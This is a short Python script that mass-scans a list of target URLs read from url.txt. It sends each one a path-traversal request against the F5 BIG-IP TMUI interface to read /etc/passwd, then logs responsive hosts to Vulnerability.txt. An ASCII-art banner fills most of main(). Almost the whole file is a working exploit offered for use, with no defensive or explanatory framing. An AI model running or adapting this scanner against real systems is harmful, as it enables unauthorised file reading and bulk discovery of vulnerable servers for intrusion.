import requests
import urllib.parse
import pandas as pd
import time
import warnings
warnings.filterwarnings('ignore')
def az(urls):
	try:
		cc = urls+ ("/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd")
		res=requests.get(url =cc,verify = False)
		res.raise_for_status()
		if res.status_code == 200:
			with open('Vulnerability.txt', mode='a', encoding='utf-8') as f:
				f.write(urls+'\n')
	except requests.RequestException as e:
		print(e)
	time.sleep(1)
	print(cc)
	print(res)

	

def main():
	print("")
	print("　　　　　　　＃＃＃　　　　　　　　　　　　　　　＃＃＃　　　　　　　＃＃＃　　")
	print("　　　　　　　＃＃＃　　　　　　　　　　　　　　　＃＃＃　　　　　　　＃＃＃　　")
	print("　　　　　　＃＃＃＃　　　　　　　　　　　　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　　＃＃＃＃＃　　　　　＃＃＃＃＃　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　　＃＃　＃＃　　　　　　　　＃＃　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　＃＃＃　＃＃　　　　　　　＃＃＃　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　＃＃＃＃＃＃　　　　　　　＃＃　　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　＃＃＃＃＃＃＃　　　　　＃＃　　　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　＃＃　　　＃＃　　　　＃＃＃　　　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　＃＃＃　　　＃＃　　　　＃＃　　　　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　＃＃　　　　＃＃＃　　　＃＃＃＃＃＃　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　＃＃　　　　＃＃＃　　　　　　　　　　　　＃＃＃　　　　　　　＃＃＃　　")
	print("　　　　　　　　　　　　　　　　　　　　　　　　　＃＃　　　　　　　　＃＃　　　")
	print("　　　　　　　　　　　　　　　　　　　　　　　　　＃　　　　　　　　　＃　　　　")
	url_lst=[]
	#     f=open('ip.txt',encoding='utf8')
	f = pd.read_csv(open(r'url.txt'))
	#     ip_str=f.readlines()
	for u in list(f['U']):
	    u=u.replace(' ', '')
	    u=u.replace('\n', '')
	    u_lst=[u]
	    url_lst=url_lst+u_lst
	for i in url_lst:
		az(i)
if __name__ == '__main__':
    main()